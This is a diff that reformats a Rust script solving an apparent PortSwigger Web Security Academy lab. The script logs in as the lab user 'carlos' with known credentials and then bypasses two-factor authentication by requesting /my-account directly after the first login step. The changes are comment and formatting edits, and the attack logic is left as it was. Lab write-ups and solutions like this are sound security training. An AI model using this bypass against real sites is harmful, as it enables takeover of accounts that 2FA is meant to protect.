@@ -34,33 +34,62 @@ use text_colorizer::Colorize;
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0aa7007704f85c4e83f0191a00ec00ce.web-security-academy.net"; // change this URL to your lab
-    let client = build_client(); // build the client 
+    // change this to your lab URL
+    let url = "https://0aa7007704f85c4e83f0191a00ec00ce.web-security-academy.net";
+
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // try to login as as carlos
     let login = client
-    .post(format!("{url}/login"))
-    .form(&HashMap::from([
-        ("username", "carlos"),
-        ("password", "montoya"),
+        .post(format!("{url}/login"))
+        .form(&HashMap::from([
+            ("username", "carlos"),
+            ("password", "montoya"),
         ]))
-        .send(); // try to login as as carlos
-    if let Ok(res) = login { // if login succeeded
-        println!("{}", "1. Logged in as carlos.. ☑️".white().bold()); 
-        let session = extract_session_cookie(&res.headers()); // extract session from cookie header
+        .send();
+
+    // if login succeeded
+    if let Ok(res) = login {
+        println!("{}", "1. Logged in as carlos.. OK".white().bold());
+
+        // extract session from cookie header
+        let session = extract_session_cookie(&res.headers());
+
+        // try to GET /login2 page
         let login2 = client
-        .get(format!("{url}/login2"))
-        .header("Cookie", format!("session={session}"))
-        .send(); // try to GET /login2 page
-    if let Ok(res2) = login2 { // if GET /login2 succeeded 
-            println!("{}", "2. GET /login2 using extracted session.. ☑️".white().bold());
-            let home = client
-            .get(format!("{url}/my-account?id=carlos"))
+            .get(format!("{url}/login2"))
             .header("Cookie", format!("session={session}"))
-            .send(); // try to bypass the 2FA by requsting /my-account directrly
-        if let Ok(home_res) = home { // if bypass succeeded
-                println!("{}", "3. GET /my-account directly bypassing 2FA.. ☑️".white().bold());
+            .send();
+
+        // if GET /login2 succeeded
+        if let Ok(res2) = login2 {
+            println!(
+                "{}",
+                "2. GET /login2 using extracted session.. OK".white().bold()
+            );
+
+            // try to bypass the 2FA by requsting /my-account directrly
+            let home = client
+                .get(format!("{url}/my-account?id=carlos"))
+                .header("Cookie", format!("session={session}"))
+                .send();
+
+            // if bypass succeeded
+            if let Ok(home_res) = home {
+                println!(
+                    "{}",
+                    "3. GET /my-account directly bypassing 2FA.. OK"
+                        .white()
+                        .bold()
+                );
+
+                // search for name carlos in the body
                 let body = home_res.text().unwrap();
-                let carlos_name = extract_pattern("Your username is: (carlos)", &body); // search for name carlos in the body
-                if carlos_name.len() != 0 { // check if the name exist
+                let carlos_name = extract_pattern("Your username is: (carlos)", &body);
+
+                // check if the name exist
+                if carlos_name.len() != 0 {
                     println!("{}", "✅ Logged in successfully as Carlos".green().bold());
                 } else {
                     println!("{}", "Failed to login as Carlos".red().bold());
